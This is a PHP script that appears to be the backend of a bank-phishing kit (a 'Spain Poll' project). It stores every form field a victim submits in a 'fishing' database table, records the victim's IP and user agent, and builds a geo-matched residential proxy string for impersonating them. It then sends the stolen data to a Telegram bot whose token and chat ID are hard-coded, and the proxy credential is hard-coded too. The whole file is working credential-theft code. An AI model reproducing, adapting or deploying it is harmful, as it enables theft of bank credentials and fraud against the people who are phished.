<?php
require_once('config.php');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $botId = mysqli_real_escape_string($link, $_POST['botid']);
    $target = mysqli_real_escape_string($link, $_POST['target']);
    $ip = $_SERVER['REMOTE_ADDR'];
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $project = "Spain Poll";
    $ref = "admin";

    // Создаем пустую переменную для хранения параметров
    $postParams = "";

    // Перебираем все параметры из POST-запроса
    foreach ($_POST as $key => $value) {
        // Пропускаем параметры botid и target
        if ($key != 'botid' && $key != 'target') {
            // Добавляем параметр к строке postParams
            $postParams .= "$key=`$value`, ";
        }
    }

    $proxy = getProxyString($ip);

    $message = "Новые данные!\n"
    . "Botid: `$botId`\n"
    . "Банк: $target\n"
    . "Айпи: `$ip`\n"
    . "Юзерагент: `$userAgent`\n"
    . "Прокся: `$proxy`\n"    
    . "САМ БАНК: $postParams\n";

    $sql = "SELECT * FROM fishing WHERE botid = ?";
    $stmt = $link->prepare($sql);
    $stmt->bind_param("s", $botId);
    $stmt->execute();
    $result = $stmt->get_result();

    if ($result->num_rows > 0) {
        $row = $result->fetch_assoc();
        $existingVal = $row['val'];

        // Объединяем существующие данные и новые данные
        $updatedVal = $existingVal . "\n " . $postParams;

        $sql = "UPDATE fishing SET val = ? WHERE botid = ?";
        $stmt = $link->prepare($sql);
        $stmt->bind_param("ss", $updatedVal, $botId);

        if ($stmt->execute()) {
            echo "Данные успешно обновлены в базе данных";
        } else {
            echo "Ошибка при обновлении данных в базе данных: " . $stmt->error;
        }
    } else {
        $sql = "INSERT INTO fishing (botid, ref, ip, ua, project, target, val) VALUES (?, ?, ?, ?, ?, ?, ?)";
        $stmt = $link->prepare($sql);
        $stmt->bind_param("sssssss", $botId, $ref, $ip, $userAgent, $project, $target, $postParams);

        if ($stmt->execute()) {
            echo "Данные успешно записаны в базу данных";
        } else {
            echo "Ошибка при записи данных в базу данных: " . $stmt->error;
        }
    }

    sendMessageToTelegram($message);

    $stmt->close();
    $link->close();
}


function sendMessageToTelegram($message) {
    $telegramToken = "6153609907:AAEMsscZdDmUhKef0tkpeDraRKI6TChYZr4";
    $chatId = "-853246784";
    $telegramApiUrl = "https://api.telegram.org/bot$telegramToken/sendMessage?chat_id=$chatId&parse_mode=MarkDown&text=" . urlencode($message);
    $response = file_get_contents($telegramApiUrl);

    if ($response === false) {
        echo "Ошибка при отправке сообщения в Telegram";
    } else {
        echo "Сообщение успешно отправлено в Telegram";
    }
}

function getProxyString($ip) {
    $url = "https://checker.soax.com/api/ipinfo?ip=" . $ip;
    $response = file_get_contents($url);
    $data = json_decode($response, true);

    if ($data['status']) {
        $country_code = strtolower($data['data']['country_code']);
        $region = strtolower($data['data']['region']);
        $city = strtolower($data['data']['city']);

        $proxy = "rw9XxTqfppWa5TiC:wifi;" . $country_code . ";;" . $region . ";" . $city . "@proxy.soax.com:9000";

        return $proxy;
    } else {
        return null;
    }
}
?>
